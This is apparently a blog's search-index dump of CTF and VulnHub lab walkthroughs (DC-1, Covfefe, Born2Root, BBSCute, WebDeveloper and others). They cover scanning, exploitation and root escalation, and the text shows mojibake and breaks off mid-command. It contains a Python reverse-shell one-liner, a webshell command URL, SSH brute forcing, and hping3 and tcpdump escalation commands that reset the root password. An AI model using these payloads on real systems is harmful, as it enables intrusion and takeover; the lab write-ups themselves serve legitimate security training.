Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.There are five flags in total, but the ultimate goal is to find and read the flag in root is home directory. You do not even need to be root to do this, however, you will require root privileges.Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.---**TECHNICAL INFORMATION**DC-1 is a VirtualBox VM built on Debian 32 bit, so there should be no issues running it on most PCs.While I have not tested it within a VMware environment, it should also work.It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.---**IMPORTANT**While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In saying that, there should not be any problems, but I feel the need to throw this out there just in case.---**CONTACT**This is the first vulnerable lab challenge that I've created, so feel free to let me know what you think of it.I can be contacted via Twitter - @DCAU7{: .prompt-tip }### Letâ€™s find the IP Address first >>![154-1.png](/Vulnhub-Files/img/DC-1/154-1.png)```bashIP : 10.0.2.6```{: .nolineno}## Port Scan Results âž¡ï¸![154-3.png](/Vulnhub-Files/img/DC-1/154-3.png)![154-2.png](/Vulnhub-Files/img/DC-1/154-2.png)```bashOPEN PORTS >22 SSH80 HTTP111 RPC38164 RPC```{: .nolineno}---## Web Enumeration â¤µï¸![154-4.png](/Vulnhub-Files/img/DC-1/154-4.png)Since it is drupal CMS so lets use the drupal Enumeration Tools â†’![154-5.png](/Vulnhub-Files/img/DC-1/154-5.png)Now lets search an exploit for drupal 7 â†’I found one on github â†’![154-6.png](/Vulnhub-Files/img/DC-1/154-6.png)Now lets try it out â†’link : [https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)![154-7.png](/Vulnhub-Files/img/DC-1/154-7.png)Now lets try reverse shell code is it working or not â†’![154-8.png](/Vulnhub-Files/img/DC-1/154-8.png)![154-9.png](/Vulnhub-Files/img/DC-1/154-9.png)Now lets see what I can do inside the shell â†’![154-10.png](/Vulnhub-Files/img/DC-1/154-10.png)![154-11.png](/Vulnhub-Files/img/DC-1/154-11.png)Looking into the SUIDs files â†’![154-12.png](/Vulnhub-Files/img/DC-1/154-12.png)![154-13.png](/Vulnhub-Files/img/DC-1/154-13.png)![154-14.png](/Vulnhub-Files/img/DC-1/154-14.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Covfefe", "url": "/posts/Covfefe/", "categories": "Proving Grounds, Play", "tags": "Buffer Overflow, authorized_keys, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "Lets find out the victim IP address â¤µï¸![Untitled](/Vulnhub-Files/img/Covfefe/Untitled.png)```{: .nolineno}IP : 10.0.2.34```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Covfefe...", "content": "Lets find out the victim IP address â¤µï¸![Untitled](/Vulnhub-Files/img/Covfefe/Untitled.png)```{: .nolineno}IP : 10.0.2.34```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/covfefe]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.34Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 12:42 ISTNmap scan report for 10.0.2.34Host is up (0.00074s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10 (protocol 2.0)| ssh-hostkey: | 2048 d06a10e0fb6322be09960b716a60ad1a (RSA)| 256 ac2c111ee2d626ea58c43e2d3e1edd96 (ECDSA)|_ 256 13b3dbc5af62c2b1607d2f48efc313fc (ED25519)80/tcp open http nginx 1.10.3|_http-title: Welcome to nginx!|_http-server-header: nginx/1.10.331337/tcp open http Werkzeug httpd 0.11.15 (Python 3.5.3)|_http-title: 404 Not Found| http-robots.txt: 3 disallowed entries |_/.bashrc /.profile /taxesMAC Address: 08:00:27:0D:F7:D7 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%202.png)Now lets access these files .![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%203.png)Like this way I tried and successfully accessed `/.ssh/id_rsa` file and `.bash_history` file .Now lets find out the paraphrase for the ssh login shell >>![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%204.png)Now to find out the username I think I can find inside the `/.ssh/authorized_keys` .![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%205.png)Lets login Now >>>![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%206.png)I got the shell >>>Now I found a file names as `read_message` lets execute it >>![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%207.png)Now I see I can access /root directory >>![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%208.png)lets read the `read_message.c` file â¤µï¸```csimon@covfefe:/root$ cat read_message.c #include #include #include // You're getting close! Here is another flag:// **flag2{use_the_source_luke}**int main(int argc, char *argv[]) { char program[] = \"/usr/local/sbin/message\"; char buf[20]; char authorized[] = \"Simon\"; printf(\"What is your name?\\n\"); gets(buf); // Only compare first five chars to save precious cycles: if (!strncmp(authorized, buf, 5)) { printf(\"Hello %s! Here is your message:\\n\\n\", buf); // This is safe as the user can not mess with the binary location: execve(program, NULL, NULL); } else { printf(\"Sorry %s, you're not %s! The Internet Police have been informed of this violation.\\n\", buf, authorized); exit(EXIT_FAILURE); }}```{: .nolineno}So this is a buffer overflow machine where I have to input 20 characters to exploit the buffer , here Simon contains 5 characters and I need to input 15 more characters as input then shell command, Lets do this >>![Untitled](/Vulnhub-Files/img/Covfefe/Untitled%209.png)```bash# cat flag.txtYou did it! Congratulations, here is the final flag:flag3{das_bof_meister}#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Broken", "url": "/posts/Broken/", "categories": "Proving Grounds, Play", "tags": "Password Bruteforce, Recon, timedatectl, PrivEsc, reboot", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the Victim Machine IP address â¬‡ï¸![Untitled](/Vulnhub-Files/img/Broken/Untitled.png)```bashIP : 192.168.249.132```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Download...", "content": "### Lets check the Victim Machine IP address â¬‡ï¸![Untitled](/Vulnhub-Files/img/Broken/Untitled.png)```bashIP : 192.168.249.132```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Broken]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.132Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 03:49 EDTNmap scan report for 192.168.249.132Host is up (0.00086s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 395ebf8a49a313fa0d34b8db265779a7 (RSA)| 256 20d772be306a2714e1e6c2167a40c852 (ECDSA)|_ 256 84a09a59612ab71edd6eda3b91f9a0c6 (ED25519)80/tcp open http Apache httpd 2.4.18| http-ls: Volume /| SIZE TIME FILENAME| 55K 2019-08-09 01:20 README.md| 1.1K 2019-08-09 01:21 gallery.html| 259K 2019-08-09 01:11 img_5terre.jpg| 114K 2019-08-09 01:11 img_forest.jpg| 663K 2019-08-09 01:11 img_lights.jpg| 8.4K 2019-08-09 01:11 img_mountains.jpg|_|_http-title: Index of /|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 00:0C:29:06:6B:9F (VMware)Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Broken/Untitled%201.png)Now with `img_.jpg` files I assume that `` are the only change to use it as **usernames** and **password** both so I used it for ssh brute force .![Untitled](/Vulnhub-Files/img/Broken/Untitled%202.png)Lets hydra it â¤µï¸![Untitled](/Vulnhub-Files/img/Broken/Untitled%203.png)SSH shell time âž¡ï¸![Untitled](/Vulnhub-Files/img/Broken/Untitled%204.png)Letâ€™s see what it can do â¬‡ï¸![Untitled](/Vulnhub-Files/img/Broken/Untitled%205.png)Lets try `/usr/bin/timedatectl` â¤µï¸![Untitled](/Vulnhub-Files/img/Broken/Untitled%206.png)![Untitled](/Vulnhub-Files/img/Broken/Untitled%207.png)Now I am root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Boss Players CTF", "url": "/posts/Boss-Players-CTF/", "categories": "Proving Grounds, Play", "tags": "Command Injection, Recon, SUIDs, find, PrivEsc, RFI, grep", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled.png)```{: .nolineno}IP : 10.0.2.38```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Down...", "content": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled.png)```{: .nolineno}IP : 10.0.2.38```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/bossplayerCTF]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.38 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:06 ISTNmap scan report for 10.0.2.38Host is up (0.0017s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0)| ssh-hostkey: | 2048 ac0d1e7140ef6e6591958d1c13138e3e (RSA)| 256 249e2718dfa4783b0d118a9272bd058d (ECDSA)|_ 256 26328d73890529438ea113ba4f8353f8 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:E0:9B:01 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¬‡ï¸![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%201.png)Source Code â¬‡ï¸![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%202.png)![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%203.png)lets load that file âž¡ï¸![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%204.png)Now lets try Command Injection â¤µï¸![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%205.png)Now lets try reverse shell command of python âž¡ï¸![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%206.png)Now lets check the SUIDs and GUIDs files for execution â¤µï¸![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%207.png)```bash# cat root.txtcat root.txtY29uZ3JhdHVsYXRpb25zCg==#```{: .nolineno}![Untitled](/Vulnhub-Files/img/Boss-Players-CTF/Untitled%208.png)> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Born2Root", "url": "/posts/Born2Root/", "categories": "Proving Grounds, Play", "tags": "Password Bruteforce, Recon, cronjob, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the IP Address Now â¤µï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled.png)```bashIP : 10.0.2.42```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitl...", "content": "### Lets check the IP Address Now â¤µï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled.png)```bashIP : 10.0.2.42```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Born2Root]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.42Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 16:53 ISTNmap scan report for 10.0.2.42Host is up (0.00072s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)| ssh-hostkey: | 1024 3d6f4088766a1da1fd910fdc86b78113 (DSA)| 2048 eb29c0cbeb9a0b52e79cc4a667dc33e1 (RSA)| 256 d40299b0e77d401864df3b285b9ef907 (ECDSA)|_ 256 e9c40c6d4b154a584f69cddf1376324e (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-title: Secretsec Company | http-robots.txt: 2 disallowed entries |_/wordpress-blog /files|_http-server-header: Apache/2.4.10 (Debian)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 33425/tcp6 status| 100024 1 33917/udp status| 100024 1 35694/tcp status|_ 100024 1 44304/udp6 status35694/tcp open status 1 (RPC #100024)MAC Address: 08:00:27:B9:D7:A2 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%202.png)Lets go to directory âž¡ï¸ `/wordpress-blog/` >![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%203.png)Now while directory or files bruteforcing I also found a directory of `/icons/` so lets dig into it âž¡ï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%204.png)Lets open this file `VDSoyuAXiO.txt` â¬‡ï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%205.png)I got private key lets ssh now â¬‡ï¸```bashwget http://10.0.2.42/icons/VDSoyuAXiO.txt -O rsachmod 600 rsa```{: .nolineno}![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%206.png)Inside this shell I got a buff.c file â¬‡ï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%207.png)and also while checking crontabs I found a file executing âž¡ï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%208.png)After looking into tmp I canâ€™t find any files so lets create [sekurity.py](https://sekurity.py) file inside /tmp/ â¤µï¸![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%209.png)Now I have to wait â€¦![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%2010.png)After that I found a file named as networker Lets see what it does >![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%2011.png)So it is executing echo so letâ€™s make echo as /bin/bash then run networker Lets try it out â¤µï¸No Luck â€¦```bashhadi:x:1000:1000:hadi,,,:/home/hadi:/bin/bashmartin:x:1001:1001:,,,:/home/martin:/bin/bashjimmy:x:1002:1002:,,,:/home/jimmy:/bin/bash```{: .nolineno}So we have 2 users and hadi have highest privileges so letâ€™s brute force the ssh password with custom made pasword file.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Born2Root]â””â”€$ cat /usr/share/wordlists/rockyou.txt | grep hadi > hadi_pass.txt```{: .nolineno}Lets run hydra now .![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%2012.png)got it `hadi : hadi123` >![Untitled](/Vulnhub-Files/img/Born2Root/Untitled%2013.png)```bashroot@debian:~# cat flag.txt ,-----. ,---. ,------. ,--. | |) /_ ,---. ,--.--.,--,--, '.-. \\| .--. ' ,---. ,---. ,-' '-. | .-. \\| .-. || .--'| \\ .-' .'| '--'.'| .-. || .-. |'-. .-' | '--' /' '-' '| | | || |/ '-.| |\\ \\ ' '-' '' '-' ' | | `------' `---' `--' `--''--''-----'`--' '--' `---' `---' `--' Congratulations ! you pwned completly Born2root is CTF .I hope you enjoyed it and you have made Tea is overdose or coffee is overdose :p I have blocked some easy ways to complete the CTF ( Kernel Exploit ... ) for give you more fun and more knownledge ...Pwning the box with a linux binary misconfiguration is more fun than with a Kernel Exploit !Enumeration is The Key .Give me feedback :[FB] Hadi Meneroot@debian:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "BTRsys : 1", "url": "/posts/BTRsys-1/", "categories": "Proving Grounds, Play", "tags": "mysql, Wordpress, PrivEsc, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled.png)```bashIP : 192.168.249.138```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Provi...", "content": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled.png)```bashIP : 192.168.249.138```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/BTRsys]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.138Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 02:11 EDTNmap scan report for pinkydb (192.168.249.138)Host is up (0.00086s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.249.128| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 08eee3ff3120876c12e71caac4e754f2 (RSA)| 256 ade11c7de78676be9aa8bdb968927787 (ECDSA)|_ 256 0ce1eb060c5cb5cc1bd1fa5606223167 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_Hackers|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 00:0C:29:A7:26:87 (VMware)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled%201.png)![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled%202.png)Now lets try to find the user with wpscan tool â†’![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled%203.png)![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled%204.png)![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled%205.png)![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled%206.png)```bashwww-data@ubuntu:/$ uname -anLinux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linuxwww-data@ubuntu:/$```{: .nolineno}Lets see the wp-config.php file â†’```bashwww-data@ubuntu:/var/www/html/wordpress$ cat wp-config.php select * from wp_users \\G ;*************************** 1. row *************************** ID: 1 user_login: root user_pass: a318e4507e5a74604aafb45e4741edd3 : roottoor user_nicename: btrisk user_email: mdemir@btrisk.com user_url: user_registered: 2017-04-24 17:37:04user_activation_key: user_status: 0 display_name: btrisk*************************** 2. row *************************** ID: 2 user_login: admin user_pass: 21232f297a57a5a743894a0e4a801fc3 user_nicename: admin user_email: ikaya@btrisk.com user_url: user_registered: 2017-04-24 17:37:04user_activation_key: user_status: 4 display_name: admin2 rows in set (0.00 sec)ERROR: No query specifiedmysql>```{: .nolineno}![Untitled](/Vulnhub-Files/img/BTRsys-1/Untitled%207.png)Now lets dig deeper â†’```bashbtrisk@ubuntu:/var/www/html/wordpress$ sudo -l[sudo] password for btrisk: Matching Defaults entries for btrisk on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser btrisk may run the following commands on ubuntu: (ALL : ALL) ALL (ALL : ALL) ALLbtrisk@ubuntu:/var/www/html/wordpress$ sudo /bin/bash -iroot@ubuntu:/var/www/html/wordpress# whoamirootroot@ubuntu:/var/www/html/wordpress# cd ~root@ubuntu:~# ls -altotal 40drwxr-xr-x 4 btrisk 1000 4096 Apr 24 2017 .drwxr-xr-x 3 root root 4096 Mar 17 2017 ..-rw------- 1 btrisk 1000 243 May 2 2017 .bash_history-rw-r--r-- 1 btrisk 1000 220 Mar 17 2017 .bash_logout-rw-r--r-- 1 btrisk 1000 3771 Mar 17 2017 .bashrcdrwx------ 2 btrisk 1000 4096 Mar 17 2017 .cache-rw------- 1 btrisk 1000 453 Mar 23 2017 .mysql_historydrwxrwxr-x 2 btrisk 1000 4096 Mar 21 2017 .nano-rw-r--r-- 1 btrisk 1000 655 Mar 17 2017 .profile-rw-r--r-- 1 btrisk 1000 0 Mar 17 2017 .sudo_as_admin_successful-rw------- 1 btrisk 1000 586 Mar 21 2017 .viminforoot@ubuntu:~# iduid=0(root) gid=0(root) groups=0(root)root@ubuntu:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "BBSCute", "url": "/posts/BBSCute/", "categories": "Proving Grounds, Play", "tags": "CMS, CuteNews_CMS, RFI, hping3, PrivEsc, Public Exploit, File Upload, SUIDs", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the IP address of victim machine first âž¡ï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled.png)```bashIP : 10.0.2.48```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Down...", "content": "### Lets check the IP address of victim machine first âž¡ï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled.png)```bashIP : 10.0.2.48```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/BBSCute]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.48Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 19:53 ISTNmap scan report for 10.0.2.48Host is up (0.00056s latency).Not shown: 65530 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 04d06ec4ba4a315a6fb3eeb81bed5ab7 (RSA)| 256 24b3df010bcac2ab2ee949b058086afa (ECDSA)|_ 256 6ac4356a7a1e7e51855b815c7c744984 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Apache2 Debian Default Page: It works88/tcp open http nginx 1.14.2|_http-title: 404 Not Found|_http-server-header: nginx/1.14.2110/tcp open pop3 Courier pop3d|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) UTF8(USER) LOGIN-DELAY(10) STLS TOP UIDL PIPELINING USER| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-09-17T16:28:06|_Not valid after: 2021-09-17T16:28:06|_ssl-date: TLS randomness does not represent time995/tcp open ssl/pop3 Courier pop3d|_pop3-capabilities: UTF8(USER) LOGIN-DELAY(10) IMPLEMENTATION(Courier Mail Server) TOP UIDL PIPELINING USER|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-09-17T16:28:06|_Not valid after: 2021-09-17T16:28:06MAC Address: 08:00:27:BF:70:A5 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%201.png)### Directory / Files Bruteforcing âž¡ï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%202.png)Now lets dig into the index.php file â†’![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%203.png)Lets Register first â†’![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%204.png)Now I canâ€™t find captcha this was because of my IP address configuration so manually I need to call `captcha.php` file for captcha â¬‡ï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%205.png)with that lets login Now with my credentials â¤µï¸```bashUsername : shiva Password : password```{: .nolineno}After login I got this interface âž¡ï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%206.png)After looking for an exploit I got this [exploit](https://www.exploit-db.com/exploits/48800) and I followed the path â†’![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%207.png)Here in this exploit I have to create a payload file like this â¤µï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%208.png)Now with gif magic byte the file is now image file â†’Now lets upload it through our dashboard â¬‡ï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%209.png)Now when I saved it , It got successfully uploaded so now I have to load the file for that lets follow through the exploit again â€”>![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%2010.png)Through this my URL was â†’ [https://10.0.2.48/uploads/avatar_shiva_payload.php?cmd=whoami](https://10.0.2.48/uploads/avatar_shiva_payload.php?cmd=whoami)In response I got â¬‡ï¸![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%2011.png)Now its time for reverse shell python payload input â†’```bashPython Payload >python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.27\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'```{: .nolineno}![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%2012.png)Now when I got the shell lets check for SUIDs and GUIDs â†’![Untitled](/Vulnhub-Files/img/BBSCute/Untitled%2013.png)Also I found `user.txt` file â€”>```bashwww-data@cute:/home/fox$ cat user.txtcat user.txtdcb8189a0eaf7a690a67785a7299be60www-data@cute:/home/fox$```{: .nolineno}Now lets exploit our hping3 â¤µï¸```bashwww-data@cute:/$ /usr/sbin/hping3 /usr/sbin/hping3hping3> /bin/sh -p/bin/sh -p# whoamiwhoamiroot## ls -alls -altotal 32drwx------ 3 root root 4096 Sep 23 2020 .drwxr-xr-x 18 root root 4096 Sep 17 2020 ..-rw------- 1 root root 70 Sep 23 2020 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc-rw------- 1 root root 36 Sep 17 2020 .lesshst-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwxr-xr-x 2 root root 4096 Sep 17 2020 localweb-rw------- 1 root root 33 Sep 18 2020 root.txt# cat root.txtcat root.txt0b18032c2d06d9e738ede9bc24795ff2#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Webdeveloper", "url": "/posts/WebDeveloper/", "categories": "VulnHub", "tags": "Wordpress, Wireshark, PrivEsc, CMS, tcpdump", "date": "2023-06-11 00:00:00 +0530", "snippet": "## Description â¤µï¸> ðŸ’¡ A machine using the newest REMOVED ### Server, the newest REMOVED ### and containing some REMOVED ## Changelog v1 - 2018/11/05 Beta - 2018/9/22{: .prompt-i...", "content": "## Description â¤µï¸> ðŸ’¡ A machine using the newest REMOVED ### Server, the newest REMOVED ### and containing some REMOVED ## Changelog v1 - 2018/11/05 Beta - 2018/9/22{: .prompt-info}### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled.png)```bashIP : 192.168.56.107```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%201.png)```textOpen Ports >22\tSSH80\tHTTP```{: .nolineno}---## Web Enumeration â¤µï¸I checked the port 80 :![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%202.png)After Directory Bruteforcing we got this :![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%203.png)After diging in I got this finally :![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%204.png)```bashCredentials ->log = webdeveloperpwd = Te5eQg&4sBS!Yr$)wf%(DcAd```{: .nolineno}![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%205.png)Now it time to upload reverse shell code and get the shell up and running :>**With PHP reverse shell linux code I got this :**![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%206.png)Got these credentials from wp-config.php file :![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%207.png)```bashPassword : MasterOfTheUniverse```{: .nolineno}![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%208.png)![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%209.png)![Untitled](/Vulnhub-Files/img/WebDeveloper/Untitled%2010.png)flag.txt :Congratulations here is youre flag:`cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290`For the root shell I changed the passwd of root to root with chpasswd command :```bashCommand :echo \"root:root\" > test.txtCOMMAND=\"cat /tmp/test.txt | chpasswd\"TFt=$(mktemp)echo \"$COMMAND\" > $TFtchmod +x $TFtsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z 